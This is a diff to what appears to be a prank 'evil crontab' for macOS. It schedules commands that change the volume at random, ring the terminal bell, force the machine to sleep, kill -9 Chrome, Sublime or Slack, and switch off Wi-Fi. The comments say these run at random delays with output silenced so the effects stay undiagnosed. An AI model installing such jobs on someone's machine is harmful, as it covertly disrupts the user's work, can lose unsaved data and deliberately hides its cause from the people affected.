@@ -5,22 +5,19 @@
 # Designed to be subtle in its evilness, and aims to have its effects
 # go not unnoticed, but undiagnosed for as long as possible.
 #
-#┌───────────── minute (0 - 59)
-#│ ┌───────────── hour (0 - 23)
-#│ │ ┌───────────── day of month (1 - 31)
-#│ │ │ ┌───────────── month (1 - 12)
-#│ │ │ │ ┌───────────── day of week (0 - 6) (Sunday to Saturday;
-#│ │ │ │ │                                       7 is also Sunday on some systems)
-#│ │ │ │ │
+# Format: wait_for_a_while_to_make_evilness_irregular && do_evil_thing get_rid_of_output_to_avoid_cron_mails
 
-# Waits for some time between 15 and 45 minutes
-function wait_a_while() {
-  sleep $(((15 * 60) + (RANDOM * 1800 / 32767)))
-}
+# Keep changing the volume
+*/5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))"
 
-# Avoid cron alert mails
-function run_silently() {
-  eval "${@}" > /dev/null 2>&1
-}
+# Make annoying sound once every 15 minutes
+*/15 * * * * sleep $(((5 * 60) + (RANDOM * 5 * 60 / 32767))) && tput bel
 
-* * * * * wait_a_while && run_silently pmset sleepnow
+# Go to sleep once every hour
+0 * * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && pmset sleepnow > /dev/null 2>&1
+
+# Kill a app once every three hours
+0 */3 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && apps=('Chrome' 'Sublime' 'Slack') && app=${apps[$RANDOM % ${#apps[@]} ]} && kill -9 $(pgrep $app)
+
+# Switch off wifi once every four hours
+0 */4 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && networksetup -setairportpower en0 off
